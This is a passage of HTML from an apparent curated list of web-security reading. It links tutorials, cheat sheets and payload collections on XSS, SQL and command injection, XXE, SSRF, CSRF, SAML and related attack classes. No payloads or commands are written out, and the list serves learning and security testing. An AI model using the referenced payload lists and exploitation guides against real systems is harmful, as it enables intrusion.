class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjZnJlZS5jb20v\">指尖安全</span> - 垂直互联网安全媒体 by <a href=\"%E6%8C%87%E5%B0%96%E5%AE%89%E5%85%A8\">指尖安全</a>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tLw==\">安全脉搏</span> - Blog for Security things.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb2Nrci5vcmcv\">破壳（Beta）</span> - 能看漏洞报告的安全社区 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb2J1Zy5jb20v\">SOBUG 漏洞悬赏平台</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcm9wcy5zZWNxdWFuLm9yZy8=\">Drops (backup)</span> - Drops was known as a famous knowledge base for hacking technology.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudDAwbHMubmV0Lw==\">T00LS</span> - T00LS - 低调求发展 - 潜心习安全.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vY2hhaXRpbi10ZWNo\">长亭技术专栏</span> - 安全攻防技术分享 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2hhaXRpbi5jbi96aC8=\">长亭科技</span>.</li>\n</ul>\n<p><a name=\"intro\"></a></p>\n<h2 id=\"introduction\"><a class=\"anchor\" href=\"#introduction\">#</a> Introduction</h2>\n<p><a name=\"xss\"></a></p>\n<h3 id=\"xss-cross-site-scripting\"><a class=\"anchor\" href=\"#xss-cross-site-scripting\">#</a> XSS - Cross-Site Scripting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9pbnRsL3N3L2Fib3V0L2FwcHNlY3VyaXR5L2xlYXJuaW5nL3hzcy8=\">Cross-Site Scripting – Application Security – Google</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8=\">Google</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9INVND\">H5SC</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1Mw==\">@cure53</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9Bd2Vzb21lWFNT\">AwesomeXSS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0x1Y2FCb25naW9ybmkvWFNTLnBuZw==\">XSS.png</span> - Written by @jackmasa.- <span class=\"exturl\" data-url=\"aHR0cHM6Ly9leGNlc3MteHNzLmNvbS8=\">C.XSS Guide</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pha29iS2FsbGlu\">@JakobKallin</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2lyZW5lbG9ib3ZhbGJ1ZW5hLw==\">Irene Lobo Valbuena</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9leGNlc3MteHNzLmNvbS8=\">C.XSS Guide</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pha29iS2FsbGlu\">@JakobKallin</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2lyZW5lbG9ib3ZhbGJ1ZW5hLw==\">Irene Lobo Valbuena</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wYXVsb3N5aWJlbG8uY29tLzIwMTgvMDYvdGhlLWJpZy1iYWQtd29sZi14c3MtYW5kLW1haW50YWluaW5nLmh0bWw=\">THE BIG BAD WOLF - XSS AND MAINTAINING ACCESS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wYXVsb3N5aWJlbG8uY29tLw==\">Paulos Yibelo</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gveHNzLXBheWxvYWQtbGlzdA==\">payloadbox/xss-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1hTUyUyMEluamVjdGlvbg==\">PayloadsAllTheThings - XSS Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"prototype-pollution\"></a></p>\n<h3 id=\"prototype-pollution\"><a class=\"anchor\" href=\"#prototype-pollution\">#</a> Prototype Pollution</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVSL3Byb3RvdHlwZS1wb2xsdXRpb24tbnNlYzE4L2Jsb2IvbWFzdGVyL3BhcGVyL0phdmFTY3JpcHRfcHJvdG90eXBlX3BvbGx1dGlvbl9hdHRhY2tfaW5fTm9kZUpTLnBkZg==\">Prototype pollution attack in NodeJS application</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVS\">@HoLyVieR</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">phithon</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tL3Byb3RvdHlwZS1wb2xsdXRpb24tcmNlLWtpYmFuYS1jdmUtMjAxOS03NjA5Lw==\">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zZWN1cml0eW1i\">@securitymb</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnA2LmlzL1JlYWwtV29ybGQtSlMtMS8=\">Real-world JS - 1</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9wbzZpeA==\">@po6ix</span>.</li>\n</ul>\n<p><a name=\"csv-injection\"></a></p>\n<h3 id=\"csv-injection\"><a class=\"anchor\" href=\"#csv-injection\">#</a> CSV Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXdzLndlYmFtb296LmNvbS93cC1jb250ZW50L3VwbG9hZHMvYm90L29mZnNlY21hZy8xNDcucGRm\">CSV Injection -&gt; Meterpreter on Pornhub</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnpzZWMudWsv\">Andy</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2dlb3JnZW1hdWVyLm5ldC8yMDE3LzEwLzA3L2Nzdi1pbmplY3Rpb24uaHRtbA==\">The Absurdly Underestimated Dangers of CSV Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2dlb3JnZW1hdWVyLm5ldC8=\">George Mauer</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL0NTViUyMEluamVjdGlvbg==\">PayloadsAllTheThings - CSV Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"sql-injection\"></a></p>\n<h3 id=\"sql-injection\"><a class=\"anchor\" href=\"#sql-injection\">#</a> SQL Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vYmxvZy93ZWItc2VjdXJpdHkvc3FsLWluamVjdGlvbi1jaGVhdC1zaGVldC8=\">SQL Injection Cheat Sheet</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9uZXRzcGFya2Vy\">@netsparker</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcWx3aWtpLm5ldHNwaS5jb20v\">SQL Injection Wiki</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3BpLmNvbS8=\">NETSPI</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWJzZWMuY2Eva2Ivc3FsX2luamVjdGlvbg==\">SQL Injection Pocket Reference</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9MaWdodE9T\">@LightOS</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RvZ2V3YXRjaC5naXRodWIuaW8vMjAxNy8wMi8yNy9teXNxbC1FcnJvci1CYXNlZC1JbmplY3Rpb24v\">Error Based SQL Injection - MySQL</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2RvZ2V3YXRjaC5naXRodWIuaW8v\">DogeWatch</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvc3FsLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=\">payloadbox/sql-injection-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1NRTCUyMEluamVjdGlvbg==\">PayloadsAllTheThings - SQL Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"command-injection\"></a></p>\n<h3 id=\"command-injection\"><a class=\"anchor\" href=\"#command-injection\">#</a> Command Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3J1YnkvcnVieS9wdWxsLzE3Nzc=\">Potential command injection in resolv.rb</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyaWdnM3I=\">@drigg3r</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvY29tbWFuZC1pbmplY3Rpb24tcGF5bG9hZC1saXN0\">payloadbox/command-injection-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL0NvbW1hbmQlMjBJbmplY3Rpb24=\">PayloadsAllTheThings - Command Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"orm-injection\"></a></p>\n<h3 id=\"orm-injection\"><a class=\"anchor\" href=\"#orm-injection\">#</a> ORM Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuaDN4c3RyZWFtLmNvbS8yMDE0LzAyL2hxbC1mb3ItcGVudGVzdGVycy5odG1s\">HQL for pentesters</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oM3hzdHJlYW0v\">@h3xstream</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3luYWNrdGl2LmNvbS9yZXNzb3VyY2VzL2hxbDJzcWxfc3N0aWNfMjAxNV9lbi5wZGY=\">HQL : Hyperinsane Query Language (or how to access the whole SQL API within a HQL injection ?)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9fbTBiaXVz\">@_m0bius</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvMGFuZzNlbC9vcm0ycHduLWV4cGxvaXRpbmctaW5qZWN0aW9ucy1pbi1oaWJlcm5hdGUtb3Jt\">ORM2Pwn: Exploiting injections in Hibernate ORM</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly8wYW5nM2VsLmJsb2dzcG90LnR3Lw==\">Mikhail Egorov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvc2ltb25lLm9ub2ZyaS9vcm0taW5qZWN0aW9u\">ORM Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vbm9mcmkub3JnLw==\">Simone Onofri</span>.</li>\n</ul>\n<p><a name=\"ftp-injection\"></a></p>\n<h3 id=\"ftp-injection\"><a class=\"anchor\" href=\"#ftp-injection\">#</a> FTP Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuYmxpbmRzcG90c2VjdXJpdHkuY29tLzIwMTcvMDIvYWR2aXNvcnktamF2YXB5dGhvbi1mdHAtaW5qZWN0aW9ucy5odG1s\">Advisory: Java/Python FTP Injections Allow for Firewall Bypass</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wbHVzLmdvb2dsZS5jb20vMTA1OTE3NjE4MDk5NzY2ODMxNTg5\">Timothy Morgan</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGlmdG9yZGllLmRlL2Jsb2cvMjAxNy8wMi8xOC9zbXRwLW92ZXIteHhlLw==\">SMTP over XXE − how to send emails using Java's XML parser</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGlmdG9yZGllLmRlLw==\">Alexander Klink</span>.</li>\n</ul>\n<p><a name=\"xxe\"></a></p>\n<h3 id=\"xxe-xml-external-entity\"><a class=\"anchor\" href=\"#xxe-xml-external-entity\">#</a> XXE - XML eXternal Entity</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92aWRlby80OTk2MS5odG1s\">XML 实体攻击 - 从内网探测到命令执行步步惊心</span> - Written by 张天琪.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iMW5nei5naXRodWIuaW8vWFhFLWxlYXJuaW5nLW5vdGUv\">XXE 漏洞的简单理解和测试</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iMW5nei5naXRodWIuaW8v\">@b1ngz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9waG9uZXhpY3VtLmdpdGh1Yi5pby9pbmZvc2VjL3h4ZS5odG1s\">XXE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9waG9uZXhpY3Vt\">@phonexicum</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3h4ZQ==\">XML external entity (XXE) injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">portswigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnNlY3VyaXR5LmNvbS9kb3dubG9hZC9wdWJsaWNhdGlvbnMvWE1MRFRERW50aXR5QXR0YWNrcy5wZGY=\">XML Schema, DTD, and Entity Attacks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9lY2JmdHc=\">Timothy D. Morgan</span> and Omar Al Ibrahim.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gveHhlLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=\">payloadbox/xxe-injection-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1hYRSUyMEluamVjdGlvbg==\">PayloadsAllTheThings - XXE Injection</span> - Written by various contributors.</li>\n</ul>\n<p><a name=\"csrf\"></a></p>\n<h3 id=\"csrf-cross-site-request-forgery\"><a class=\"anchor\" href=\"#csrf-cross-site-request-forgery\">#</a> CSRF - Cross-Site Request Forgery</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVyL3dpcGluZy1vdXQtY3NyZi1kZWQ5N2FlN2U4M2Y=\">Wiping Out CSRF</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVy\">@jrozner</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cudGVjaGJyaWRnZS5jYy8yMDE3LzAyLzI1L2NzcmYtaW50cm9kdWN0aW9uLw==\">讓我們來談談 CSRF</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cudGVjaGJyaWRnZS5jYy8=\">TechBridge</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL0NTUkYlMjBJbmplY3Rpb24=\">PayloadsAllTheThings - CSRF Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"clickjacking\"></a></p>\n<h3 id=\"clickjacking\"><a class=\"anchor\" href=\"#clickjacking\">#</a> Clickjacking</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW1wZXJ2YS5jb20vbGVhcm4vYXBwbGljYXRpb24tc2VjdXJpdHkvY2xpY2tqYWNraW5nLw==\">Clickjacking</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW1wZXJ2YS5jb20v\">Imperva</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9QdWJsaWNhdGlvbnMvYmxvYi9tYXN0ZXIveGZvLWNsaWNramFja2luZy5wZGY/cmF3PXRydWU=\">X-Frame-Options: All about Clickjacking?</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpbw==\">Mario Heiderich</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm0xNTdxLnR3L3Bvc3RzLzIwMTgvMDcvMjMvY2xpY2tqYWNraW5nLWZyYW1lLWF0dGFjay1kZWZlbnNlLw==\">新增幾項設定來防範 Clickjacking Frame Attack</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm0xNTdxLnR3Lw==\">M157q</span>.</li>\n</ul>\n<p><a name=\"ssrf\"></a></p>\n<h3 id=\"ssrf-server-side-request-forgery\"><a class=\"anchor\" href=\"#ssrf-server-side-request-forgery\">#</a> SSRF - Server-Side Request Forgery</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZG9jdW1lbnQvZC8xdjFUa1dadHJoelJMeTBiWVhCY2RMVWVkWEdiOW5qVE5JSlhhM3U5YWtITS9lZGl0\">SSRF bible. Cheatsheet</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxsYXJtLmNvbS8=\">Wallarm</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1NlcnZlciUyMFNpZGUlMjBSZXF1ZXN0JTIwRm9yZ2VyeQ==\">PayloadsAllTheThings - Server-Side Request Forgery</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"web-cache-poisoning\"></a></p>\n<h3 id=\"web-cache-poisoning\"><a class=\"anchor\" href=\"#web-cache-poisoning\">#</a> Web Cache Poisoning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9wcmFjdGljYWwtd2ViLWNhY2hlLXBvaXNvbmluZw==\">Practical Web Cache Poisoning</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hbGJpbm93YXg=\">@albinowax</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1dlYiUyMENhY2hlJTIwRGVjZXB0aW9u\">PayloadsAllTheThings - Web Cache Deception</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"relative-path-overwrite\"></a></p>\n<h3 id=\"relative-path-overwrite\"><a class=\"anchor\" href=\"#relative-path-overwrite\">#</a> Relative Path Overwrite</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFjb2x5ZXIub3JnLzIwMTgvMDUvMjgvbGFyZ2Utc2NhbGUtYW5hbHlzaXMtb2Ytc3R5bGUtaW5qZWN0aW9uLWJ5LXJlbGF0aXZlLXBhdGgtb3ZlcndyaXRlLw==\">Large-scale analysis of style injection by relative path overwrite</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFjb2x5ZXIub3JnLw==\">The Morning Paper</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWJzZC5qcC9XaGl0ZXBhcGVyL3Jwby5wZGY=\">MBSD Technical Whitepaper - A few RPO exploitation techniques</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWJzZC5qcC8=\">Mitsui Bussan Secure Directions, Inc.</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NjczMS5odG1s\">RPO 攻击方式的探究</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXV0aG9yL0swcnozbg==\">K0rz3n</span>.</li>\n</ul>\n<p><a name=\"open-redirect\"></a></p>\n<h3 id=\"open-redirect\"><a class=\"anchor\" href=\"#open-redirect\">#</a> Open Redirect</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zMGNrZXQ3LmNvbS9vcGVuLXJlZGlyZWN0LXZ1bG5lcmFiaWxpdHkv\">Open Redirect Vulnerability</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zMGNrZXQ3LmNvbS8=\">s0cket7</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvb3Blbi1yZWRpcmVjdC1wYXlsb2FkLWxpc3Q=\">payloadbox/open-redirect-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL09wZW4lMjBSZWRpcmVjdA==\">PayloadsAllTheThings - Open Redirect</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"saml\"></a></p>\n<h3 id=\"security-assertion-markup-language-saml\"><a class=\"anchor\" href=\"#security-assertion-markup-language-saml\">#</a> Security Assertion Markup Language (SAML)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYvYmxvZy8yMDE5LTAzLTA3LWhvdy10by10ZXN0LXNhbWwtYS1tZXRob2RvbG9neS8=\">How to Hunt Bugs in SAML; a Methodology - Part I</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYv\">epi</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYvYmxvZy8yMDE5LTAzLTEzLWhvdy10by10ZXN0LXNhbWwtYS1tZXRob2RvbG9neS1wYXJ0LXR3by8=\">How to Hunt Bugs in SAML; a Methodology - Part II</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYv\">epi</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYvYmxvZy8yMDE5LTAzLTE2LWhvdy10by10ZXN0LXNhbWwtYS1tZXRob2RvbG9neS1wYXJ0LXRocmVlLw==\">How to Hunt Bugs in SAML; a Methodology - Part III</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYv\">epi</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1NBTUwlMjBJbmplY3Rpb24=\">PayloadsAllTheThings - SAML Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"upload\"></a></p>\n<h3 id=\"upload\"><a class=\"anchor\" href=\"#upload\">#</a> Upload</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG9jcy9lbmdsaXNoLzQ1MDc0LWZpbGUtdXBsb2FkLXJlc3RyaWN0aW9ucy1ieXBhc3MucGRm\">File Upload Restrictions Bypass</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vYXV0aG9yLz9hPTkzODE=\">Haboob Team</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1VwbG9hZCUyMEluc2VjdXJlJTIwRmlsZXM=\">PayloadsAllTheThings - Upload Insecure Files</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"rails\"></a></p>\n<h3 id=\"rails\"><a class=\"anchor\" href=\"#rails\">#</a> Rails</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RldmNvLnJlL2Jsb2cvMjAxNS8wNy8yNC90aGUtdnVsbmVyYWJpbGl0eS1vZi1keW5hbWljLXJlbmRlci1wYXRocy1pbi1yYWlscy8=\">Rails 動態樣板路徑的風險</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2RldmNvLnJlL2Jsb2cvYXV0aG9yL3NoYW9saW4v\">Shaolin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrbWQuaW8vcy9Ta3VUVnc1Ty0=\">Rails Security - First part</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ng==\">@qazbnm456</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JydW5vZmFjY2EvemVuLXJhaWxzLXNlY3VyaXR5LWNoZWNrbGlzdA==\">Zen Rails Security Checklist</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JydW5vZmFjY2E=\">@brunofacca</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYWlscy1zcWxpLm9yZw==\">Rails SQL Injection</span> - Written by <span class=\"exturl\" 